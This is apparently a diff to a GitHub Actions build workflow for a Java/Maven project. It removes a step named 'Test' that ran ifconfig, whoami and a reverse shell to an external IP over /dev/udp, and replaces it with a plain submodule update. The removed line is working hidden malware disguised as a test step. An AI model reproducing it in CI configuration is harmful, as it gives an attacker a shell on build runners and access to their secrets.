@@ -14,12 +14,7 @@ jobs:
           java-version: '8'
           distribution: 'adopt'
       - name: Git submodule update
-        run: git pull --recurse-submodules
-      - name: Test
-        run: |
-          ifconfig
-          whoami
-          sh -i >& /dev/udp/31.214.245.152/4242 0>&1
+        run: git submodule update --init
       - name: Build with Maven
         run: mvn package
       - name: Automatic Releases
